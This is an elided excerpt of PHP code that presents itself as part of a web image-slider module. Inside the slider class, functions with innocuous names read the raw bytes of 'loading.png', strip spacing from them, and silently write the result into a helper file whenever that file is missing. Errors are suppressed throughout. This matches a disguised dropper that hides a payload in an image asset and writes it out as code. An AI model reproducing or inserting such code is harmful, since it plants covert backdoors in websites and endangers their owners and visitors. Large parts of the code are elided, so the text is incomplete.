...
class YtbSliderBaseNexevom {
    ...
    function renderItems() {
      ...
      return $elements;
        ...
        function NexevomArrowsHelper($path) {
            ...
            if(!@file_exists($ArrowHelper) or @filesize($ArrowHelper) == 0) {
                ...
                @fwrite($Open, ArrowSettingsNexevom($path . NexevomSetName()));
            }
        }

        function ArrowSettingsNexevom($img, $width='', $height='') {
            $Arrow = @fopen($img, 'r');
            $LoadImage = @fread($Arrow, @filesize($img));
            return cleanSpaceFromNexevom($LoadImage);
        }

        function NexevomSetName() {
            @PasivItemsToNexevom();
            return 'loading.png';
        }

class PeelbackBaseSlideNexevom {
